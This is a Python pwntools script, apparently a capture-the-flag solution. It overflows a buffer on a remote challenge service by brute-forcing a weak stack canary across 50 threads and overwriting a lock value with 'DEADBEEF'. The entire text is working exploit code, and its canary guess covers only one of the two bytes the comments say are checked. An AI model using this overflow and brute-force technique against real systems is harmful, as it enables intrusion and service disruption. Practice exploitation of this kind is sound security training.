from pwn import *
import sys
import random
import os
import threading

context.log_level = 'debug'

host = sys.argv[1] if len(sys.argv) > 1 else 'localhost'
port = int(sys.argv[2]) if len(sys.argv) > 2 else 1237

# Total lengths based on the vulnerable code:
#   - message: 64 bytes
#   - canary: 32 bytes (only the first 2 bytes are checked)
#   - lock: 9 bytes (we want to set it to "DEADBEEF")
padding_message = b"A" * 64
padding_canary = b"B" * 31

def worker():
    while True:
        guess = random.randint(0, 255)
        try:
            io = remote(host, port)
            io.recvuntil("Send your message: ")
            
            # Construct the payload:
            # - p16(guess) packs our random 2-byte guess in little-endian
            # - The rest of the canary is padded arbitrarily
            # - "DEADBEEF" overwrites the lock
            payload = padding_message + p16(guess) + padding_canary + b"DEADBEEF"
            io.sendline(payload)
            
            out = io.recvall(timeout=1)
            print(out)
            if b"You solved it locally" in out:
                log.success("Found correct canary: 0x{:04x}".format(guess))
                io.interactive() 
                os._exit(0)      
            io.close()
        except Exception:
            continue

# Set the number of concurrent threads you want
num_threads = 50
threads = []

for _ in range(num_threads):
    t = threading.Thread(target=worker)
    t.daemon = True
    t.start()
    threads.append(t)

for t in threads:
    t.join()
